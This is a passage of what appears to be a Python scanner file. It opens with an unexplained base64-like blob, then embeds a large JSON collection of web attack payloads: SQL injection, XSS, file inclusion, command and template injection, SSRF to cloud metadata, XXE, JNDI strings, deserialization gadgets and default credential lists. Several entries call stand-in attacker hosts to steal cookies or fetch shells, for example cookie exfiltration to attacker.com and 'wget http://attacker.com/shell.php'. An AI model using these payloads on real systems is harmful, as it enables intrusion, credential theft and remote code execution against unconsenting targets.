iP0IsLjkTPi2XsND7ykp173zla8s99BZK2jIExyC+ZDiMzoeQeJ6+sFYiRSWTWnc7lEebhf+SUVH6gIKWB7zo7taq5Vw+EEc/C2R9GPqJdaDBjPJUtUClm9zusx7p6ScrpdrHksA0QgaUxdpD0y7VUsIeA5h1ufrF0kNJWGbNXoXE6FG+U2Q+dEsR7+igFxH1W16qJYy8rD/6n83Ny6mvK6ONLgH9FzLGyfuiI3FeVIu+peAoluWUeUWMQ15MayIpNwrCkE+YAQrRJwheyWlM+DlwtUaMnrHJbTvK3+DoxnUFGXMv0jU3vT6lf2kla7DnQ9lMH0xAy0tF8EdsDBE5mY5ljYdj8896js/JSgv/qeIbhwcJqA1UxTMkIHcn+zQMY9x2QgVmj7OYT7VgCdulMkf8zN9vvsQtljiD6N+KPOHVwZlcnfKV7h4eYN0cTzwcz5hl95eK5VBS+Rvt/AfPp79GGhkRZB+YkX5Om+Lbp7wSC0779u0t8kFRYUVsVltK3pPDR3l5snaSgj3xM+tn6Hd0Fol72E/3h7tCvApbZOtTyLnDgz06ziAJCdIqopQwguieA6S1/7DgRBN5sUPzoBXrDRjAM1ARiZk7Hr+MTya041o1vpt7AGAGFrk9t1g2nVwzTktqZwW0YXw4SwzSH7YISEZgW6Hb2eZndHOWPCnqIH8UjUKJxovtTyZSKgM8NZRVOfu7VXeX+dGJwSFNZA3mbYMNiQNoCer9Rih+AC+H4/8kViTa6RjLhluDNMsw09Di8F79EZpjBEDkrGVZ7e/Eqm5hgZMF8godDOcMlR4Th3+iagJ6r6E5abS3t8Ia0u1/k0BC6D/WzInPQPgFw7ZaLM6ZxnIa1Oh9/HmdfVw4fxdxdVKsF0qpwpfzcIYsQOWBeLSLVDagTObQ1rKf5+guApyj0iILkGpkFtE6QO1yIt/LV+9Jr3HMEEXJbxtC4IpV7tqXMAuja2QWTXIeL6cR49cTic9Z3G2TsuzcX9pL24OA+TriaCdhZ22qDIpqTyvjk38uzA23q8ttzjAyHDJoKZ42yixPnjyep+NKNmZZDRarpL+Dd+jvm9BDNEpGSeOf8KcdskIqMD9TEzbVmeyKtgKaTV9rmM8bfDON3ovqzP7qhOpE/FefDiini3qjZY97n+9y1t1mOB1pCqjczV5e5D3y1FIY4Rtj7Gt8SOHsLpQq38Rv2UNu0l0a0QTR15JK68MWPOY7vgqd9tOHbpDXsddDzqA8tpRN9/kfzO0A5itntRbV7qOGO5x29BR+zAG8zi8Gsq7OE1ON/51IfqX1aYa2uaT1Mvh/oAD/9HV5Zuzv0CY5B5aczrLw/E/Eh+mgeCoX2cEfLn762Mdt2BxrAhslTSBHetAjG/4glvdUdvfMCYZYuBg+GYOj4ZBw2u3o79JeUV8RXYOxsUdZ2effarQaubRfal75ceJL1EbE9Nl0iKMi0B9+Txx/OcNRqoeJQRYACUd1jmQgzM541PUk0S93xiyXpodP0JvAK8FtaTVAtX6VJqMndSwrxjEGVLLKGS61M+BvhbPrklZVaraWOFF79mZH+6guHWupaY+daXzjqVyJiZEB3Afb/2C2Vs4+L2ptKhqcOfGr2H/BU4ymKHduqkDvUqY1D8QAf6po5cpgWyV5F4EVmhUA6ogZ9WVfFEh5daIxWR0H+vOinHFGmgAAKhYiViRiJEQDvKhr2nQwUP05rn44++aR22gIENQpVdxQFLt7fjYsxhBIh56ukJTRG7NreAdCZHtRJ0oM0ThaGOUAC57IgGH6QALskwSEgAAAA"

# ─── Embedded payload and vulnerability data (no external JSON files needed) ───
_EMBEDDED_PAYLOADS = json.loads('{"SQLi": ["\'", "\\"", "\' OR \'1\'=\'1", "\' OR \'1\'=\'1\'--", "\\" OR \\"1\\"=\\"1", "\' OR 1=1--", "\' OR 1=1#", "\' OR 1=1/*", "\' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "1\' AND extractvalue(1,concat(0x7e,(SELECT version())))--", "1\' AND updatexml(1,concat(0x7e,(SELECT database())),1)--", "\' OR SLEEP(5)--", "\'; WAITFOR DELAY \'0:0:5\'--", "1 AND SLEEP(5)", "\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "1\'; SELECT pg_sleep(5)--", "\' AND 1=1--", "\' AND 1=2--", "1 AND 1=1", "1 AND 1=2", "\' AND substring(username,1,1)=\'a\'--", "\' UNION SELECT NULL--", "\' UNION SELECT NULL,NULL--", "\' UNION SELECT NULL,NULL,NULL--", "\' UNION SELECT table_name,NULL FROM information_schema.tables--", "\' UNION ALL SELECT 1,2,3--", "admin\'--", "admin\' #", "\' OR 1=1 LIMIT 1--", "\') OR (\'1\'=\'1", "\' OR \'x\'=\'x", "\'; DROP TABLE users--", "\'; INSERT INTO users VALUES(1,\'hack\',\'hack\')--", "\' AND LOAD_FILE(\'/etc/passwd\')--", "\'; EXEC xp_cmdshell(\'id\')--", "1; SELECT * FROM users WHERE 1=1"], "XSS": ["<script>alert(\'XSS\')</script>", "<img src=x onerror=alert(\'XSS\')>", "<svg onload=alert(\'XSS\')>", "\';alert(\'XSS\')//", "\\"><script>alert(\'XSS\')</script>", "<body onload=alert(\'XSS\')>", "<input onfocus=alert(\'XSS\') autofocus>", "<select onchange=alert(\'XSS\')><option>1</option></select>", "<details ontoggle=alert(\'XSS\') open>", "<video><source onerror=alert(\'XSS\')>", "<ScRiPt>alert(\'XSS\')</ScRiPt>", "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>", "javascript:alert(\'XSS\')", "<a href=javascript:alert(\'XSS\')>click</a>", "\'-alert(\'XSS\')-\'", "\\"-alert(\\"XSS\\")-\\"", "<img/src=x onerror=alert(1)>", "<<script>alert(\'XSS\')//<</script>", "<script>alert(String.fromCharCode(88,83,83))</script>", "<iframe src=\\"javascript:alert(\'XSS\')\\">", "<img src=\\"x\\" onerror=\\"this.src=\'http://attacker.com/?c=\'+document.cookie\\">", "<base href=//attacker.com/>", "<script src=//attacker.com/xss.js></script>", "<link rel=import href=//attacker.com/xss.html>", "<math><mi//xlink:href=\'javascript:alert(1)\'>"], "XSS_DOM": ["#<img src=x onerror=alert(1)>", "#\';alert(1)//", "#\\"><script>alert(1)</script>", "?q=<script>alert(1)</script>", "javascript:void(document.domain)", "#<svg/onload=alert(document.cookie)>"], "LFI": ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd", "../../../../../../etc/passwd", "../../../../../../../../../etc/passwd", "../etc/passwd%00", "../etc/passwd\\u0000", "%2e%2e%2fetc%2fpasswd", "..%2Fetc%2Fpasswd", "%2e%2e/%2e%2e/etc/passwd", "%252e%252e%252fetc%252fpasswd", "..\\\\..\\\\Windows\\\\win.ini", "..\\\\..\\\\..\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\win.ini", "/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ", "/proc/self/cmdline", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf", "/var/log/apache2/access.log", "php://filter/convert.base64-encode/resource=index.php", "php://filter/read=string.rot13/resource=../etc/passwd", "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "expect://id", "zip://shell.jpg#shell.php"], "RFI": ["http://evil.com/shell.txt", "https://evil.com/shell.php", "//evil.com/shell.php", "ftp://evil.com/shell.php", "http://evil.com/shell.txt?", "http://evil.com/shell.txt%00"], "RCE": ["<?php system(\'id\'); ?>", "<?php passthru(\'id\'); ?>", "<?php exec(\'id\',$o); echo implode(\\"\\\\n\\",$o); ?>", "${7*7}", "{{7*7}}", "; id", "| id", "` id`", "$(id)", "; cat /etc/passwd", "| cat /etc/passwd", "& type C:\\\\Windows\\\\win.ini", "() { :; }; /bin/bash -c \'id\'", "eval(base64_decode(aWQ=))", "system(chr(105).chr(100))", "{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}", "${Runtime.getRuntime().exec(\'id\')}", "${jndi:ldap://attacker.com/a}", "${${lower:j}ndi:${lower:l}dap://attacker.com/a}", "system(\'id\')", "`id`", "cmd.exe /c whoami", "powershell -command \\"Get-Process\\"", "wget http://attacker.com/shell.php -O /tmp/shell.php", "require(\'child_process\').exec(\'id\')", "; sleep 5", "| sleep 5", "& ping -n 5 127.0.0.1"], "CommandInjection": ["; id", "| id", "|| id", "& id", "&& id", "`id`", "$(id)", "; cat /etc/passwd", "| cat /etc/passwd", "; whoami", "| whoami", "& whoami", "& type C:\\\\Windows\\\\win.ini", "| dir C:\\\\", "& dir", "cmd /c whoami", "; cmd /c whoami", ";id;", "|id|", "${IFS}id", "; sleep 5", "| sleep 5", "& ping -c 5 127.0.0.1", "& ping -n 5 127.0.0.1", ";$(id)#", "`sleep 5`"], "SSRF": ["http://localhost/", "http://127.0.0.1/", "http://[::1]/", "http://0.0.0.0/", "http://0/", "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://metadata.google.internal/computeMetadata/v1/", "http://169.254.169.254/metadata/v1/", "http://100.100.100.200/latest/meta-data/", "http://localhost:8080/", "http://localhost:8443/", "http://localhost:9200/", "http://localhost:6379/", "http://localhost:27017/", "http://localhost:5432/", "http://localhost:3306/", "file:///etc/passwd", "file:///C:/Windows/win.ini", "dict://localhost:11211/stats", "gopher://localhost:9200/_GET%20/", "ftp://localhost/", "http://127.1/", "http://2130706433/", "http://[0:0:0:0:0:ffff:127.0.0.1]/", "http://localtest.me/", "http://spoofed.burpcollaborator.net/", "http://attacker.com@127.0.0.1/", "http://127.0.0.1#attacker.com"], "XXE": ["<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>", "<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\"file:///C:/Windows/win.ini\\">]><root>&xxe;</root>", "<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\"http://169.254.169.254/latest/meta-data/\\">]><root>&xxe;</root>", "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \\"file:///etc/shadow\\">]><foo>&xxe;</foo>", "<?xml version=\\"1.0\\"?><!DOCTYPE data [<!ENTITY file SYSTEM \\"file:///proc/self/environ\\">]><data>&file;</data>", "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \\"http://attacker.com/evil.dtd\\">%xxe;]><foo>test</foo>", "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY % xxe \\"<!ENTITY exfil SYSTEM \'http://attacker.com/?x=\'>\\">%xxe;]><foo>&exfil;</foo>"], "LDAPInjection": ["*", "*)(uid=*", "*()|(&(uid=*", "*()|%26", "*)(|(password=*))", "admin*)((|userPassword=*)", "*(|(mail=*))", "))(|(objectClass=*", "*(objectClass=*)", "admin)(|(uid=*"], "XPathInjection": ["\' or \'1\'=\'1", "\' or \'1\'=\'1\' or \'\'=\'", "x\' or name()=\'username\' or \'x\'=\'y", "\') or (\'1\'=\'1", "\\" or \\"1\\"=\\"1", "\' or 1=1 or \'a\'=\'a", "admin\' or 1=1 or \'a\'=\'a"], "NoSQLInjection": ["{\\"$gt\\": \\"\\"}", "{\\"$ne\\": null}", "{\\"$where\\": \\"sleep(5000)\\"}", "{\\"$regex\\": \\".*\\"}", "{\\"username\\": {\\"$ne\\": null}, \\"password\\": {\\"$ne\\": null}}", "true, $where: \'1 == 1\'", ", $where: \'1 == 1\'", "$where: \'1 == 1\'", "0;return true", "\'||\'1\'==\'1"], "TemplateInjection": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*\'7\'}}", "${7*\'7\'}", "{{config}}", "{{self.__class__.__mro__}}", "{{\'\'.__class__.__mro__[1].__subclasses__()}}", "{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}", "{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}", "{{_self.env.registerUndefinedFilterCallback(\'exec\')}}{{_self.env.getFilter(\'id\')}}", "{{[\'id\']|map(\'system\')|join}}", "<#assign ex=\\"freemarker.template.utility.Execute\\"?new()>${ex(\\"id\\")}", "#set($x=\'\')##$x.class.forName(\'java.lang.Runtime\').getMethod(\'exec\',\'\'.class).invoke($x.class.forName(\'java.lang.Runtime\').getMethod(\'getRuntime\').invoke(null),\'id\')", "{php}echo `id`;{/php}", "<%= `id` %>", "<%= system(\'id\') %>", "{{#with \\"s\\" as |string|}}{{\'function\' in @root}}{{/with}}"], "InfoDisclosure": ["/package-lock.json", "Pipfile", "/.env", "/backup.zip", "package.json", "/debug", "clientaccesspolicy.xml", "/CHANGELOG.md", ".env.production", "CHANGELOG.md", "/Dockerfile", "/kubernetes.yml", "/.git/HEAD", "settings.php", ".env.local", "/.hg/hgrc", "/wp-config.php.bak", "/.env.backup", "/status", "/Pipfile", "/LICENSE", "/admin/", "/config.yaml", "composer.json", "/__debug__/", "requirements.txt", "swagger.json", "dump.sql", "/INSTALL", "/node_modules/.package-lock.json", "/openapi.json", "/site.tar.gz", "/WEB-INF/web.xml", "robots.txt", "admin/", "/Gemfile", "/.env.bak", "/clientaccesspolicy.xml", "/.git/COMMIT_EDITMSG", "/sitemap.xml", ".env.backup", "backup.tar.gz", "/robots.txt", ".git/HEAD", "/requirements.txt", "db.sql", "/info.php", "Jenkinsfile", "database.sql", "phpmyadmin/", "yarn.lock", "/actuator/health", "/trace", "/.bzr/branch/format", "/test.php", "/error_log", "web.config", "/README", "config.php", "/metrics", "/wp-config.php", "/admin.php", "backup.zip", ".travis.yml", "/.github/workflows/deploy.yml", "/db_backup.sql", "info.php", "/config.php", ".DS_Store", "/server-status", "/yarn.lock", "/swagger.json", "/.ssh/id_rsa", "api/v1/", "wp-config.php.bak", "/humans.txt", "/CHANGELOG", "/actuator/env", "openapi.json", ".gitlab-ci.yml", "sitemap.xml", "/env", "/admin_backup.sql", "/phpinfo.php", "composer.lock", "Gemfile", "/api-docs", ".env", "/.travis.yml", "Dockerfile", "config.php.bak", "/crossdomain.xml", "/package.json", "/graphql", "/.htpasswd", "/config.yml", "/debug.php", "/settings.py.bak", "/dump.sql", "wp-config.php", "/application.yml", "/.htaccess", "/.well-known/security.txt", "/database.sql", "/config/database.yml", ".git/config", "/pyproject.toml", "docker-compose.yml", "/secrets.json", "/Gemfile.lock", "/api/docs", "/settings.py", "/credentials", "/logs/error.log", "/logs/access.log", "/api/swagger", "server-info", "/id_rsa", "/README.md", "crossdomain.xml", "Gemfile.lock", "/server-info", "/actuator", "api/v2/", "/.svn/entries", "/console", "/.env.production", "/.env.local", "/CHANGELOG.txt", "/TODO", "/.circleci/config.yml", "/Jenkinsfile", "parameters.yml", "/.dockerignore", "/backup.sql", "/backup.tar.gz", "/admin", "/web.config", "test.php", "/id_dsa", ".git/COMMIT_EDITMSG", "/application.properties", "app/config/parameters.yml", "/api/v2", "/README.txt", "/api/v1", "Thumbs.db", "/secrets.yml", "/health", "/config/secrets.yml", "/log/error.log", "security.txt", "swagger.yaml", "/actuator/mappings", "/.git/config", "/php_info.php", "api/", "phpinfo.php", "server-status", "openapi.yaml", "/actuator/beans", "/credentials.json", "/var/log/apache2/error.log", "/appsettings.json", "/swagger.yaml", "/docker-compose.yml", "README.md"], "UnvalidatedRedirects": ["http://evil.com", "//evil.com", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "https://evil.com", "\\\\\\\\evil.com", "///evil.com", "/\\\\evil.com", "/%09/evil.com", "/%2F/evil.com", "//google.com%2F@evil.com", "https:evil.com", "http://evil.com%23.legitimate.com", "http://legitimate.com.evil.com", "%0d%0aLocation: http://evil.com"], "BrokenAccessControl": ["/admin/logs", "/debug", "/profile?id=1", "/account/admin", "/panel", "/api/v1/users", "/phpmyadmin/", "/jmx-console", "/user/2", "/admin", "/internal", "/dashboard", "/admin/dashboard", "/adminer", "/adminer.php", "/administrator", "/cpanel", "/account/delete", "/user/admin", "/manager", "/user/settings", "/.htaccess", "/api/internal", "/metrics", "/private", "/system", "/user/1", "/admin/", "/api/v2/admin", "/pma/", "/superadmin", "/manager/html", "/health", "/web-console", "/settings", "/.well-known/admin", "/restricted", "/api/v1/admin", "/sysadmin", "/api/admin", "/admin/config", "/wp-admin", "/phpmyadmin", "/actuator", "/manage", "/root", "/admin/users", "/backup", "/config", "/wp-admin/admin-ajax.php", "/console", "/api/users", "/env", "/admin/settings", "/management"], "HostHeaderInjection": ["evil.com", "localhost", "127.0.0.1", "internal.company.com", "evil.com:80", "legitimate.com.evil.com", "evil.com #"], "CORSBypass": ["null", "evil.com", "http://evil.com", "https://evil.com", "http://legitimate.com.evil.com", "http://evillegitimate.com"], "OpenRedirectPayloads": ["/%0a/evil.com", "//evil.com", "https:evil.com", "//evil.com", "%09evil.com", "%0devil.com", "%23evil.com", "evil%E3%80%82com"], "FourZeroThreeBypass": ["/admin", "/admin/", "/admin/.", "/admin/.", "/%2fadmin", "/%2fadmin%2f", "/admin%20", "/admin%09", "/admin%0a", "//admin", "///admin", "/./admin", "/../admin/../admin", "/admin;", "/admin;.js", "/admin;.css", "/ADMIN", "/Admin", "/aDmIn", "/admin#", "/admin?", "/admin..;/", "/admin..;/."], "JWT": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", "{\\"alg\\":\\"HS256\\",\\"kid\\":\\"../../dev/null\\"}", "{\\"alg\\":\\"HS256\\",\\"kid\\":\\"| ls -la\\"}", "{\\"alg\\":\\"RS256\\",\\"typ\\":\\"JWT\\"}", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNTE2MjM5MDIyfQ.wrong_signature"], "DefaultCredentials": {"usernames": ["admin", "Administrator", "root", "test", "guest", "user", "support", "demo", "username", "webadmin", "sysadmin", "manager", "operator", "master", "oracle", "postgres", "mysql", "sa", "ftpuser", "ubnt", "pi", "raspberry", "superuser", "supervisor", "staff", "superadmin"], "passwords": ["password", "123456", "12345678", "123456789", "password123", "admin", "admin123", "root", "root123", "toor", "pass", "Pass123", "1234567890", "qwerty", "abc123", "letmein", "welcome", "monkey", "dragon", "12345", "123123", "test", "test123", "guest", "guest123", "default", "changeme", "Changeme1", "password1", "admin@123", "admin!123", "P@ssw0rd", "P@ssword", "P@ss@word", "123qwerty", "qwerty123", "asdf", "asdf1234", "zxcvbnm", "qazwsx", "password!", "pass@word", "pwd", "ubnt", "raspberry", "pi", "blank", "", "oracle", "postgres", "mysql", "cisco", "vagrant"], "common_pairs": [{"username": "admin", "password": "admin"}, {"username": "admin", "password": "password"}, {"username": "admin", "password": "123456"}, {"username": "admin", "password": "admin123"}, {"username": "administrator", "password": "password"}, {"username": "root", "password": "root"}, {"username": "root", "password": "password"}, {"username": "root", "password": "toor"}, {"username": "test", "password": "test"}, {"username": "test", "password": "test123"}, {"username": "guest", "password": "guest"}, {"username": "guest", "password": "guest123"}, {"username": "demo", "password": "demo"}, {"username": "demo", "password": "password"}, {"username": "ubnt", "password": "ubnt"}, {"username": "postgres", "password": "postgres"}, {"username": "mysql", "password": "mysql"}, {"username": "oracle", "password": "oracle"}, {"username": "sa", "password": "sa"}, {"username": "pi", "password": "raspberry"}, {"username": "vagrant", "password": "vagrant"}, {"username": "user", "password": "user"}, {"username": "webadmin", "password": "webadmin"}, {"username": "sysadmin", "password": "sysadmin"}, {"username": "manager", "password": "manager"}, {"username": "operator", "password": "operator"}]}, "WebSocket": ["{\\"type\\":\\"ping\\"}", "{\\"type\\":\\"message\\",\\"content\\":\\"<script>alert(1)</script>\\"}", "{\\"action\\":\\"subscribe\\",\\"channel\\":\\"admin\\"}", "{\\"type\\":\\"auth\\",\\"token\\":\\"null\\"}", "{\\"userId\\":1,\\"action\\":\\"getPrivateData\\"}", "{\\"action\\":\\"deleteUser\\",\\"userId\\":2}", "{\\"type\\":\\"command\\",\\"cmd\\":\\"id\\"}", "{\\"action\\":\\"admin\\",\\"secret\\":\\"bypass\\"}"], "GraphQL": ["{\\"query\\":\\"{__schema{types{name}}}\\"}", "{\\"query\\":\\"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}\\"}", "{\\"query\\":\\"{__typename}\\"}", "{\\"query\\":\\"mutation{createUser(username:\\"admin\\",password:\\"password\\",role:\\"admin\\"){id}}\\"}", "{\\"query\\":\\"{users{id username password email role}}\\"}", "{\\"query\\":\\"{user(id:1){id username email password}}\\"}", "{\\"query\\":\\"query{__schema{queryType{name}}}\\"}"], "SAML": ["<?xml version=\\"1.0\\"?><samlp:Response xmlns:samlp=\\"urn:oasis:names:tc:SAML:2.0:protocol\\"><saml:Assertion xmlns:saml=\\"urn:oasis:names:tc:SAML:2.0:assertion\\"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>", "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><samlp:AuthnRequest xmlns:samlp=\\"urn:oasis:names:tc:SAML:2.0:protocol\\"><saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>", "<?xml version=\\"1.0\\"?><samlp:Response xmlns:samlp=\\"urn:oasis:names:tc:SAML:2.0:protocol\\"><!--inject-->", "<?xml version=\\"1.0\\"?><samlp:Response><saml:Attribute Name=\\"role\\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></samlp:Response>"], "CachePoisoning": ["X-Forwarded-Host: evil.com", "X-Forwarded-Scheme: https", "X-Forwarded-For: 127.0.0.1", "X-Original-URL: /admin", "X-Rewrite-URL: /admin", "X-Custom-IP-Authorization: 127.0.0.1", "X-Host: evil.com", "X-Forwarded-Port: 443", "Forwarded: host=evil.com", "X-HTTP-Method-Override: DELETE", "X-HTTP-Method: DELETE", "X-Method-Override: DELETE", "CF-Connecting-IP: 127.0.0.1"], "BusinessLogic": ["price=-1", "quantity=-1", "amount=0.001", "discount=100", "coupon=AAAA&coupon=BBBB", "promo_code=EXPIRED2020", "cart_total=0", "payment_method=none"], "ReDoS": ["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "(a+)+", "([a-zA-Z]+)*", "(a|aa)+", "(a|a?)+", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"], "DenialOfService": ["A repeated 10000 times", "bomb.jpg", "gigapixel.png", "{{(({{}}))}}"], "SecurityHeaders": {"missing": ["X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy", "Cache-Control", "X-XSS-Protection"], "insecure_values": {"Content-Security-Policy": "unsafe-inline", "X-Frame-Options": "ALLOWALL", "Strict-Transport-Security": "max-age=0"}}, "HTTPMethods": ["OPTIONS", "OPTION", "PUT", "DELETE", "PATCH", "TRACE", "CONNECT"], "SubdomainTakeover": ["There isn\'t a GitHub Pages site here.", "NoSuchBucket", "The specified bucket does not exist", "You\'re Almost There", "No such app", "404 Not Found", "Sorry, We Couldn\'t Find That Page", "Fastly error: unknown domain", "The feed has not been found.", "Unrecognized domain", "This UserVoice subdomain is currently available!", "The resource you are looking for has been removed", "Access Denied", "The gods are wise", "Project doesnt exist... yet!", "The thing you were looking for is no longer here"], "FileUploadBypass": ["shell.php", "shell.php5", "shell.php7", "shell.phtml", "shell.shtml", "shell.pHp", "shell.PHP", "shell.php.jpg", "shell.jpg.php", "shell.php%00.jpg", "shell.php\\u0000.jpg", "shell.asp", "shell.aspx", "shell.jsp", "shell.jspx", "shell.cfm", ".htaccess"], "PathTraversal": ["../", "..\\\\", "..%2f", "..%5c", "%2e%2e%2f", "%2e%2e/", "..%2F", "%2e%2e%5c", "....//", "..;/", "%252e%252e%252f", "..%c0%af", "..%c1%9c"], "WordPress": ["/wp-login.php", "/wp-admin/", "/wp-config.php", "/xmlrpc.php", "/wp-json/wp/v2/users", "/wp-content/debug.log", "/?author=1", "/wp-includes/", "/wp-content/uploads/", "/?p=1&preview=true"], "APIEndpoints": ["/api/v1/users", "/api/v2/users", "/api/admin", "/api/debug", "/api/config", "/api/health", "/api/metrics", "/api/keys", "/api/tokens", "/api/secrets", "/v1/", "/v2/", "/rest/", "/graphql", "/gql"], "CloudMetadata": {"AWS": "http://169.254.169.254/latest/meta-data/", "AWS_IMDSv2": "http://169.254.169.254/latest/api/token", "GCP": "http://metadata.google.internal/computeMetadata/v1/", "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "DigitalOcean": "http://169.254.169.254/metadata/v1/", "Alibaba": "http://100.100.100.200/latest/meta-data/"}, "CORS_Origins": ["null", "http://evil.com", "https://evil.com", "http://evil.trusted.com", "http://trustedevil.com", "http://localhost", "http://127.0.0.1"], "SensitiveDataExposure": ["/api/v1/users", "/api/v1/admin", "/api/debug", "/api/internal", "/v1/users/me", "/api/v2/admin/users", "/swagger.json", "/api-docs", "/openapi.json", "/graphql", "/graphiql"], "InsecureDeserialization": ["rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAA", "O:8:\\"stdClass\\":1:{s:4:\\"test\\";s:4:\\"test\\";}", "a:2:{s:8:\\"username\\";s:5:\\"admin\\";s:8:\\"password\\";s:5:\\"admin\\";}", "O:15:\\"Illuminate\\\\Auth\\\\GenericUser\\":1:{s:10:\\"attributes\\";a:2:{s:5:\\"admin\\";b:1;s:4:\\"role\\";s:5:\\"admin\\";}}", "gASVKAAAAAAAAACMCmJ1aWx0aW5zlIwEZXZhbJSTlIwGaWQoKSCUhZSBlC4=", "{\\"rce\\":\\"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'id\',function(error, stdout, stderr){console.log(stdout)})}()\\"}", "BAhbA2kGaQdpCA==", "/wEykBQAAQAAAP////8BAAAAAAAAAAwCAAAAXg=="], "MassAssignment": ["is_admin=1", "admin=true", "role=admin", "is_superuser=1", "privilege=admin", "user_type=admin", "account_type=premium", "user[is_admin]=1", "user[role]=administrator", "user[admin]=true", "price=0.01", "amount=0", "discount=100", "status=approved", "verified=true", "email_verified=1", "balance=9999999", "credits=9999999", "{\\"is_admin\\":true}", "{\\"role\\":\\"admin\\"}", "{\\"admin\\":true}", "{\\"price\\":0}", "{\\"discount\\":100}"], "RaceCondition": ["concurrent-coupon-reuse", "concurrent-withdraw", "concurrent-vote", "concurrent-file-upload"], "HTTPRequestSmuggling": ["Transfer-Encoding: chunked", "Content-Length: 0\\r\\nTransfer-Encoding: chunked", "Transfer-Encoding : chunked", "Transfer-Encoding: xchunked", "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX"], "PrototypePollution": ["{\\"__proto__\\":{\\"admin\\":true}}", "{\\"constructor\\":{\\"prototype\\":{\\"admin\\":true}}}", "__proto__[admin]=true", "constructor[prototype][admin]=true", "__proto__.isAdmin=1", "{\\"__proto__\\":{\\"polluted\\":\\"yes\\"}}", "{\\"__proto__\\":{\\"isAdmin\\":\\"true\\",\\"role\\":\\"admin\\"}}", "__proto__[toString]=function(){return \\"hacked\\"}", "__proto__[valueOf]=function(){return 1}", "{\\"__proto__\\":{\\"hasOwnProperty\\":\\"hacked\\"}}"], "ServerSideInclude": ["<!--#exec cmd=\\"id\\"-->", "<!--#include virtual=\\"/etc/passwd\\"-->", "<!--#echo var=\\"DATE_LOCAL\\"-->", "<!--#printenv-->", "<!--#exec cmd=\\"whoami\\"-->"], "CRLF": ["%0d%0aSet-Cookie:%20crlf=injected", "%0d%0aLocation:%20https://evil.com", "%0aContent-Length:%200%0a%0a", "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>", "foo%0D%0ASet-Cookie:%20bar=baz", "%E5%98%8A%E5%98%8DSet-Cookie:%20injected=true", "%0d%0aX-Injected-Header:%20hacked", "test%0d%0aHeader:%20value%0d%0a", "%0d%0a%0d%0a<html><script>alert(1)</script></html>"], "OAuth": ["redirect_uri=https://evil.com", "redirect_uri=https://legitimate.com.evil.com", "redirect_uri=https://legitimate.com@evil.com", "redirect_uri=javascript:alert(1)", "redirect_uri=//evil.com", "state=", "state=BYPASS", "response_type=token", "scope=admin%20read%20write%20delete", "scope=*", "client_id=another_app_client_id"], "IDORNumeric": ["0", "1", "2", "9999", "-1", "00", "0000000001", "null", "undefined", "admin", "me", "self"]}')
